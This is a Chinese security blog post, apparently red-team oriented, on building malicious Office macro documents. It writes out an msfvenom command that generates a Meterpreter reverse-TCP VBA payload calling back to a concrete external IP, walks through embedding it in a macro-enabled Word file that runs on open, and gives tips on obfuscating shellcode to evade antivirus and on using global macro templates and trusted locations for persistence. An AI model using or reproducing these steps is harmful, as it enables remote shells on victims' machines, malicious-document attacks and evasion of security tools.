<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>office宏 « 倾旋的博客</title>
  <meta name="description" content="0x00 宏 - Macrooffice宏，译自英文单词Macro。宏是微软公司为其office软件包设计的一个特殊功能，软件设计者为了让人们在使用软件进行工作时，避免一再地重复相同的动作而设计出来的一种工具，它利用简单的语法，把常用的动作写成宏，当在工作时，就可以直接利用事先编好的宏自动运行，去完成某项特定的任...">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/archivers/2019-05-16/1">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="post">

  <header class="post-header">
    <h1 class="post-title">office宏</h1>
    <p class="post-meta">May 16, 2019</p>
  </header>

  <article class="post-content">
    <h2 id="0x00-宏---macro">0x00 宏 - Macro</h2>

<p>office宏，译自英文单词Macro。宏是微软公司为其office软件包设计的一个特殊功能，软件设计者为了让人们在使用软件进行工作时，避免一再地重复相同的动作而设计出来的一种工具，它利用简单的语法，把常用的动作写成宏，当在工作时，就可以直接利用事先编好的宏自动运行，去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。</p>

<p>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件。也可说是一种应用程式视觉化的Basic 脚本。该语言于1993年由微软公司开发的的应用程序共享一种通用的自动化语言-Visual Basic for Application(VBA)，实际上VBA是寄生于VB应用程序的版本。</p>

<h2 id="0x01-生成宏">0x01 生成宏</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>71.19.144.69 <span class="nv">LPORT</span><span class="o">=</span>8899 <span class="nt">-f</span> vba <span class="nt">-o</span> try.vba
</code></pre></div></div>

<p>使用msf就可以生成宏代码，接下来只要放入word或者excel、ppt即可。</p>

<h2 id="0x02-创建宏">0x02 创建宏</h2>

<p>新建一个文档，另存为“启用宏的Word文档”：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f905ed50aefb30dab9fbd923e1b296a1.png" alt="2019-05-15-14-00-36"></p>

<p>视图-查看宏：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e0140a93e1c3cf38cac2031d4f3e20a7.png" alt="2019-05-15-14-02-48"></p>

<p>随便输入一个宏名称，点击“创建”：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/59c264e10758640d4a05a3ccecccf4f9.png" alt="2019-05-15-14-03-34"></p>

<p>此时进入宏编辑器：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a659557648212e62b9cd221b7306c7cf.png" alt="2019-05-15-14-04-57"></p>

<p>将msf生成的payload放入：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c8d03acde64f5652936b7b4757c1ddfc.png" alt="2019-05-15-14-05-45"></p>

<p>保存文件，关闭，再打开即可执行宏代码。</p>

<h2 id="0x03-宏代码分析">0x03 宏代码分析</h2>

<p>msf生成默认的vba会导入三个api函数，常见的shellcode加载器代码：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f07106d7fd8e17930a285fa9e20c824c.png" alt="2019-05-15-14-07-11"></p>

<ul>
  <li>CreateThread 创建线程</li>
  <li>VirtualAlloc 申请虚拟内存空间</li>
  <li>RtlMoveMemory 拷贝内存</li>
</ul>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="nf">CreateThread</span><span class="p">(</span>
  <span class="n">LPSECURITY_ATTRIBUTES</span>   <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="n">SIZE_T</span>                  <span class="n">dwStackSize</span><span class="p">,</span>
  <span class="n">LPTHREAD_START_ROUTINE</span>  <span class="n">lpStartAddress</span><span class="p">,</span>
  <span class="n">__drv_aliasesMem</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
  <span class="n">DWORD</span>                   <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="n">LPDWORD</span>                 <span class="n">lpThreadId</span>
<span class="p">);</span>
</code></pre></div></div>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="nf">VirtualAlloc</span><span class="p">(</span>
  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
  <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
  <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
  <span class="n">DWORD</span>  <span class="n">flProtect</span>
<span class="p">);</span>
</code></pre></div></div>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VOID</span> <span class="nf">RtlMoveMemory</span><span class="p">(</span>
  <span class="n">VOID</span> <span class="o">*</span> <span class="n">Destination</span><span class="p">,</span>
  <span class="n">VOID</span> <span class="o">*</span> <span class="n">Source</span><span class="p">,</span>
  <span class="n">DWORD</span> <span class="n">Length</span>
<span class="p">);</span>
</code></pre></div></div>

<p>其中<code class="language-plaintext highlighter-rouge">Array(72,131,228,240,232,...</code>就是shellcode，混淆的办法有很多种。</p>

<p>shellcode可以自己在VBA里解码或者比如每个元素自增1，运行的时候-1，达到免杀…</p>

<h2 id="0x04-效果">0x04 效果</h2>

<blockquote>
  <p>在线地址：<a href="https://www.bilibili.com/video/av52532639/">https://www.bilibili.com/video/av52532639/</a></p>
</blockquote>

<iframe src="//player.bilibili.com/player.html?aid=52532639&page=1&cid" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="95%" height="450"> </iframe>

<h2 id="0x05-拓展分析">0x05 拓展分析</h2>

<p>如果创建的是全局宏，Office会在这个目录生成一个dotm文档：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Templates</code></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/be60c1522a347282be8fcbfc77b69986.png" alt="2019-05-15-14-53-42"></p>

<p>全局宏是对于当前计算机所有文档对象有效，即文档本身不包含宏代码，也可以运行全局宏。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0a83240eaa48371c5af1d45b94e9a6c8.png" alt="2019-05-15-14-54-49"></p>

<p>很遗憾，全局宏没有一个固定的名称，也就是说要先通过Office创建一个全局宏，然后其他文档打开时才可以执行代码。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b93a33d4a8037bb9bbaf0ab152cf7e61.png" alt="2019-05-15-15-52-06"></p>

<p>经过测试，这个全局宏中的文件：<code class="language-plaintext highlighter-rouge">vbaProject.bin</code>是包含了特征的文件，但是反病毒软件不会扫描这个文件，除非主动查杀。</p>

<p>这个特性可能可以达到维持权限的作用。</p>

<p><strong>后来才发现我使用的还是全局宏达到的免杀</strong></p>

<p>HKEY_CURRENT_USER\Software\Microsoft\Office⁣16.0\PowerPoint\Security\Trusted Locations</p>

<p>同过PorcessMonitor分析，从注册表找到几个授信目录：</p>

<ul>
  <li>%APPDATA%\Microsoft\Templates</li>
  <li>C:\Program Files\Microsoft Office\Root\Templates\</li>
  <li>%APPDATA%\Microsoft\Addins</li>
  <li>C:\Program Files\Microsoft Office\Root\Document Themes 16\</li>
</ul>


  </article>
  
  




</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
